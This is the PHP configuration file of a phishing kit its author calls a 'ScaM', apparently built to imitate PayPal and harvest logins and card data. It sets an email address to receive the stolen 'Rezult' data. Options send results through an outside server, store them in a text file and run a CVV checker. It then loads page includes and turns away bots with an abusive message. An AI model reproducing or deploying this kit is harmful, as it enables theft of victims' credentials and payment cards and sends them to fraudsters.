﻿<?php 
/*[+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~­+]

[~] CaZaNoVa163-v3  ScaM
[~] Email: CaZaNoVa163@OutLook.CoM
[~] WebSite: 0xFraud.com, Checker-Tools.CoM, Dj-Samir.InFo
[~] Social: Facebook.com/CaZaNoOVa163

[+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~­+]*/
# jujurs002@gmail.com 
# You can put unlimited emails like this a@one.com,b@two.com,...

$to = "fun.fun.for.tutorial@gmail.com";  

# Other Settings #

$m1 = 0; # 0 => Disabled | 1 => Send Rezult By Our Server (see: http://www.s3curity.tn/v2_PPL/send.php)
$m2 = 0; # Text Rezult | Found in /rezmdf.html! 
$m3 = 0; # CVV CHECKER ! 

#####################################################################################################

include("functions.php");
include("CSS.php");
include("JS.php");
include("HTML.php");

if (is_bot()) {
    echo "Hello Bitch Boots | I FUCKING LOVE YOU HAHAHAHAHAHAHA <3";
    exit;
}
